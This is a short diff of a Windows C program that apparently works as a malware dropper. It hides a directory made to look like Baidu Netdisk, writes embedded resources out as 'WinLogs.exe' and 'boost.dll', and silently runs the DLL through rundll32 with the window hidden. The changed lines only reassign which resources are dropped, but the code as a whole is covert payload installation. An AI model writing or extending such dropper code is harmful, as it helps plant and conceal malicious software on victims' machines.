@@ -21,8 +21,8 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 	}
 	SetFileAttributesA(szDir, FILE_ATTRIBUTE_HIDDEN);
 
-	FreeMyResource(IDR_DINNER2, "DINNER", "C:\\BaiduNetDisk\\WinLogs.exe");
-	FreeMyResource(IDR_DINNER3, "DINNER", "C:\\BaiduNetDisk\\boost.dll");
+	FreeMyResource(IDR_DINNER3, "DINNER", "C:\\BaiduNetDisk\\WinLogs.exe");
+	FreeMyResource(IDR_DINNER4, "DINNER", "C:\\BaiduNetDisk\\boost.dll");
 
 	WinExec("C:\\Windows\\System32\\rundll32.exe C:\\BaiduNetDisk\\boost.dll SpeedUp",
 		SW_HIDE);
